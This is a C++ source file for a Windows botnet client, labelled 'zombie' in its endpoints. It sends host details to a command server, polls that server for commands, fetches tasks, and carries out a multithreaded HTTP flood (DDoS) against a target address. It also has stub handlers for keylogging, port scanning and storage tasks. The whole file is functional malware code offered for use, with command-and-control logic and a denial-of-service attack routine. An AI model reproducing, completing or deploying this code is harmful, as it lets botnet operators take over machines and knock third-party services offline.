#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "rapidjson/document.h"
#include "worker.h"
#include <sstream>
#include "nlohmann/json.hpp"
#include "win_functions.h"
#include "task.h"
#include <thread>

using json = nlohmann::json;

Worker registerWorkerWin(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo) {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return Worker();
    }

    // Create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return Worker();
    }
    // Set the server address
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(serverPort);

    // Connect to the server
    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to the server." << std::endl;
        closesocket(sock);
        WSACleanup();
        return Worker();
    }

    // Send an HTTP request to the API endpoint
    // Create the JSON data
    json requestData;
    requestData["cpu"] = cpu;
    requestData["ram"] = ramInfo;
    requestData["ip"] = inet_ntoa(ipAddress);

    // Serialize the JSON data to a string
    std::string requestBody = requestData.dump();

    // Create the HTTP request
    std::string httpRequest = "POST /zombie/register HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: " + std::to_string(requestBody.length()) + "\r\n"
        "\r\n"
        + requestBody;

    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        closesocket(sock);
        WSACleanup();
        return Worker();
    }


    // Receive and process the HTTP response
    const int receiveBufferSize = 1024;
    char receiveBuffer[receiveBufferSize];

    std::string response;

    int bytesRead;
    do {
        bytesRead = recv(sock, receiveBuffer, receiveBufferSize - 1, 0);
        if (bytesRead > 0) {
            receiveBuffer[bytesRead] = '\0';
            response += receiveBuffer;
        }
    } while (bytesRead > 0);

    //std::cout << "Received response:\n" << response << std::endl;

    // Find the start and end of the response data
    std::string responseData;
    size_t responseDataStart = response.find("{");
    size_t responseDataEnd = response.rfind("}");
    if (responseDataStart != std::string::npos && responseDataEnd != std::string::npos) {
        responseData = response.substr(responseDataStart, responseDataEnd - responseDataStart + 1);
    }

    // Print the response data
    //std::cout << "Received response data:\n" << responseData << std::endl;

    // Parse the JSON response data
    rapidjson::Document document;
    document.Parse(responseData.c_str());

    if (document.HasParseError()) {
        std::cerr << "Failed to parse JSON." << std::endl;
        closesocket(sock);
        WSACleanup();
        return Worker();
    }

    Worker workerObject;

    if (document.IsObject()) {
        if (document.HasMember("name") && document["name"].IsString()) {
            std::string name = document["name"].GetString();
            std::cout << "Name: " << name << std::endl;
            // Set the name of the Worker object
            workerObject.name = name;
        }
        if (document.HasMember("id") && document["id"].IsInt()) {
            int id = document["id"].GetInt();
            std::cout << "Id: " << id << std::endl;
            // Set the ID of the Worker object
            workerObject.id = id;
        }
    }


    std::cout << workerObject.name << std::endl;


    // Clean up
    closesocket(sock);
    WSACleanup();
    return workerObject;
}

Command beacon(const char* serverIP, int serverPort, Worker worker) {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return Command();
    }

    // Create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return Command();
    }
    // Set the server address
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(serverPort);

    // Connect to the server
    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to the server." << std::endl;
        closesocket(sock);
        WSACleanup();
        return Command();
    }

    // Send an HTTP request to the API endpoint
    int bot_id = worker.id; 
    int task_id = -1; 
    std::string progress = progressToString(Progress::SUCCESS); 

    // Construct the query string
    std::string queryParams = "bot_id=" + std::to_string(bot_id) + "&task_id=" + std::to_string(task_id) + "&progress=" + progress;

    // Create the HTTP request
    std::string httpRequest = "GET /zombie/beacon?" + queryParams + " HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "\r\n";

    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        closesocket(sock);
        WSACleanup();
        return Command();
    }


    // Receive and process the HTTP response
    const int receiveBufferSize = 1024;
    char receiveBuffer[receiveBufferSize];

    std::string response;

    int bytesRead;
    do {
        bytesRead = recv(sock, receiveBuffer, receiveBufferSize - 1, 0);
        if (bytesRead > 0) {
            receiveBuffer[bytesRead] = '\0';
            response += receiveBuffer;
        }
    } while (bytesRead > 0);

    //std::cout << "Received response:\n" << response << std::endl;

    // Find the start and end of the response data
    std::string responseData;
    size_t responseDataStart = response.find("{");
    size_t responseDataEnd = response.rfind("}");
    if (responseDataStart != std::string::npos && responseDataEnd != std::string::npos) {
        responseData = response.substr(responseDataStart, responseDataEnd - responseDataStart + 1);
    }

    // Print the response data
    //std::cout << "Received response data:\n" << responseData << std::endl;

    // Parse the JSON response data
    rapidjson::Document document;
    document.Parse(responseData.c_str());

    if (document.HasParseError()) {
        std::cerr << "Failed to parse JSON." << std::endl;
        closesocket(sock);
        WSACleanup();
        return Command();
    }

    Command commandObject = Command::REQUEST;

    if (document.IsObject()) {
        if (document.HasMember("action") && document["action"].IsString()) {
            std::string action = document["action"].GetString();
            //std::cout << "Action: " << action << std::endl;

            if (action == "REQUEST") {
                commandObject = Command::REQUEST;
            }
            else if (action == "CONTINUE") {
                commandObject = Command::CONTINUE;
            }
            else if (action == "STOP") {
                commandObject = Command::STOP;
            }
            else {
                std::cerr << "Invalid action name: " << action << std::endl;
            }
        }
    }

    // Clean up
    closesocket(sock);
    WSACleanup();
    return commandObject;
}

Task request(const char* serverIP, int serverPort, Worker worker) {
    int bot_id = worker.id;

    // Construct the query string
    std::string queryParams = "bot_id=" + std::to_string(bot_id);

    // Create the HTTP request
    std::string httpRequest = "GET /zombie/request?" + queryParams + " HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "\r\n";

    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest);
    if (httpResponse.find("HTTP/1.1 204 No Content") != std::string::npos) {
        std::cerr << "No Tasks available" << std::endl;
            WSACleanup();
            return Task();
    }

    if (httpResponse.find("HTTP/1.1 200 OK") == std::string::npos) {
        std::cerr << "Unexpected HTTP response status: " << httpResponse << std::endl;
        WSACleanup();
        return Task();
    }

    // Parse the JSON response data
    std::string extractedJSON = extractJSON(httpResponse);

    rapidjson::Document document;
    document.Parse(extractedJSON.c_str());

    if (document.HasParseError()) {
        std::cerr << "Failed to parse JSON." << std::endl;
        WSACleanup();
        return Task();
    }

    Task taskObject = Task();

    if (document.IsObject()) {
        if (document.HasMember("id") && document["id"].IsInt()) {
            int id = document["id"].GetInt();
            std::cout << "ID: " << id << std::endl;
            taskObject.id = id;
        }

        if (document.HasMember("task") && document["task"].IsString()) {
            std::string task = document["task"].GetString();
            taskObject.task = task;
        }

        if (document.HasMember("taskParameters") && document["taskParameters"].IsObject()) {
            const rapidjson::Value& taskParams = document["taskParameters"];
            if (taskParams.HasMember("address") && taskParams["address"].IsString()) {
                std::string address = taskParams["address"].GetString();
                std::cout << "Address: " << address << std::endl;
                taskObject.taskParams.address = address;
            }

            if (taskParams.HasMember("interval") && taskParams["interval"].IsInt()) {
                int interval = taskParams["interval"].GetInt();
                std::cout << "Interval: " << interval << std::endl;
                taskObject.taskParams.interval = interval;
            }

            if (taskParams.HasMember("log") && taskParams["log"].IsBool()) {
                bool log = taskParams["log"].GetBool();
                std::cout << "log: " << log << std::endl;
                taskObject.taskParams.log = log;
            }
        }
    }

    // Clean up
    WSACleanup();
    return taskObject;
}

std::string extractJSON(std::string json) {
    size_t firstBrace = json.find_first_of('{');
    size_t lastBrace = json.find_last_of('}');
    std::string extractedJSON;
    if (firstBrace != std::string::npos && lastBrace != std::string::npos && lastBrace > firstBrace) {
        extractedJSON = json.substr(firstBrace, lastBrace - firstBrace + 1);
        //std::cout << "Extracted JSON: " << extractedJSON << std::endl;
    }
    else {
        std::cout << "JSON not found in the input string." << std::endl;
    }
    return extractedJSON;
}

std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest) {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return "0";
    }

    // Create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return "0";
    }
    // Set the server address
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(serverPort);

    // Connect to the server
    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to the server." << std::endl;
        closesocket(sock);
        WSACleanup();
        return "0";
    }

    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        closesocket(sock);
        WSACleanup();
        return "0";
    }

    char buffer[1024]; // Assuming a buffer size of 1024 is sufficient for the response

    int bytesReadResp = recv(sock, buffer, sizeof(buffer), 0);
    if (bytesReadResp == SOCKET_ERROR) {
        std::cerr << "Failed to receive HTTP response." << std::endl;
        closesocket(sock);
        WSACleanup();
        return "0";
    }

    std::string httpResponse(buffer, bytesReadResp);
    // Clean up
    closesocket(sock);
    WSACleanup();
    return httpResponse;
}

in_addr getIpAddress() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        in_addr emptyAddress;
        emptyAddress.s_addr = INADDR_NONE;
        return emptyAddress;
    }

    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        std::cerr << "Failed to get hostname." << std::endl;
        WSACleanup();
        in_addr emptyAddress;
        emptyAddress.s_addr = INADDR_NONE;
        return emptyAddress; // Return an empty in_addr
    }

    struct hostent* host = gethostbyname(hostname);
    if (host == nullptr) {
        std::cerr << "Failed to get host information." << std::endl;
        WSACleanup();
        in_addr emptyAddress;
        emptyAddress.s_addr = INADDR_NONE;
        return emptyAddress; // Return an empty in_addr
    }

    struct in_addr** addr_list = reinterpret_cast<struct in_addr**>(host->h_addr_list);
    //for (int i = 0; addr_list[i] != nullptr; ++i) {
    //    std::cout << i << std::endl;
    //    std::cout << "IP Address: " << inet_ntoa(*addr_list[i]) << std::endl;
    //}

    WSACleanup();
    return *addr_list[0];
}

std::string getCPUInfo()
{
    // 4 is essentially hardcoded due to the __cpuid function requirements.
    // NOTE: Results are limited to whatever the sizeof(int) * 4 is...
    std::array<int, 4> integerBuffer = {};
    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();

    std::array<char, 64> charBuffer = {};

    // The information you wanna query __cpuid for.
    // https://learn.microsoft.com/en-us/cpp/intrinsics/cpuid-cpuidex?view=vs-2019
    constexpr std::array<int, 3> functionIds = {
        // Manufacturer
        //  EX: "Intel(R) Core(TM"
        0x8000'0002,
        // Model
        //  EX: ") i7-8700K CPU @"
        0x8000'0003,
        // Clockspeed
        //  EX: " 3.70GHz"
        0x8000'0004
    };

    std::string cpu;

    for (int id : functionIds)
    {
        // Get the data for the current ID.
        __cpuid(integerBuffer.data(), id);

        // Copy the raw data from the integer buffer into the character buffer
        std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);

        // Copy that data into a std::string
        cpu += std::string(charBuffer.data());
    }

    return cpu;
}

std::string getRAMInfo() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    if (GlobalMemoryStatusEx(&memoryStatus)) {
        DWORDLONG totalRAM = memoryStatus.ullTotalPhys;
        DWORD mbValue = static_cast<DWORD>(totalRAM / (1024 * 1024)); // Convert bytes to megabytes
        return std::to_string(mbValue);
    }

    return "";
}

bool doTask(const char* serverIP, int serverPort, Task task) {
    TaskOptions tOption = getTaskOption(task.task);
    bool finishedSuccessfully = false;
    switch (tOption) {
        case TaskOptions::DDOS:
            std::cout << "Processing DDOS task..." << std::endl;
            // Add DDOS task handling code here
            finishedSuccessfully = doDDOS(task);;
            break;
        case TaskOptions::KEY_LOG:
            std::cout << "Processing KEY_LOG task..." << std::endl;
            // Add KEY_LOG task handling code here
            finishedSuccessfully = true;
            break;
        case TaskOptions::PORT_SCAN:
            std::cout << "Processing PORT_SCAN task..." << std::endl;
            // Add PORT_SCAN task handling code here
            finishedSuccessfully = true;
            break;
        case TaskOptions::QUACK:
            std::cout << "Processing QUACK task..." << std::endl;
            // Add QUACK task handling code here
            finishedSuccessfully = true;
            break;
        case TaskOptions::STORAGE:
            std::cout << "Processing STORAGE task..." << std::endl;
            // Add STORAGE task handling code here
            finishedSuccessfully = true;
            break;
        case TaskOptions::UNKNOWN:
            std::cout << "Unknown task option." << std::endl;
            // Add code for handling unknown task here
            finishedSuccessfully = false;
            break;
    }
    return finishedSuccessfully;
}

void makeHttpDDOSRequest(std::string address, bool log) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(address.c_str());
    serverAddress.sin_port = htons(8080);

    // Create an event object
    HANDLE event = WSACreateEvent();
    if (event == WSA_INVALID_EVENT) {
        std::cerr << "Failed to create event object." << std::endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Associate the event object with the socket
    if (WSAEventSelect(sock, event, FD_CONNECT) == SOCKET_ERROR) {
        std::cerr << "Failed to associate event with socket." << std::endl;
        WSACloseEvent(event);
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Connect to the server asynchronously
    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
        if (WSAGetLastError() != WSAEWOULDBLOCK) {
            std::cerr << "Failed to connect to the server." << std::endl;
            WSACloseEvent(event);
            closesocket(sock);
            WSACleanup();
            return;
        }
    }

    std::string httpRequest = "GET / HTTP/1.1\r\n"
        "Host: " + address + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "\r\n";

    // Wait for the connection to complete or timeout
    DWORD result = WSAWaitForMultipleEvents(1, &event, FALSE, 5000, FALSE);
    if (result == WSA_WAIT_FAILED) {
        std::cerr << "Failed to wait for events." << std::endl;
    }
    else if (result == WSA_WAIT_TIMEOUT) {
        std::cerr << "Timed out while waiting for connection." << std::endl;
    }
    else {
        // Connection successful, send the HTTP request
        if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
            std::cerr << "Failed to send HTTP request." << std::endl;
        }
        else {
            if (log) {
                // Receive and print the response
                char buffer[1024];
                int bytesRead = recv(sock, buffer, sizeof(buffer), 0);
                if (bytesRead == SOCKET_ERROR) {
                    std::cerr << "Failed to receive response." << std::endl;
                }
                else if (bytesRead > 0) {
                    // Assuming the response is in ASCII format
                    std::string response(buffer, bytesRead);
                    std::cout << "Received response: " << response << std::endl;
                }
                else {
                    std::cerr << "No response received." << std::endl;
                }
            }
        }
    }
    // Clean up
    WSACloseEvent(event);
    closesocket(sock);
    WSACleanup();
    return;
}

bool doDDOS(Task task) {
    std::string address = task.taskParams.address;
    int interval = task.taskParams.interval;

    std::vector<std::thread> threads;

    for (int i = 0; i < interval; ++i) {
        Task task; // Initialize task as needed
        threads.emplace_back(makeHttpDDOSRequest, address.c_str(), task.taskParams.log);
    }

    for (std::thread& thread : threads) {
        thread.join();
    }
    std::cout << "all done" << std::endl;

    return true;
}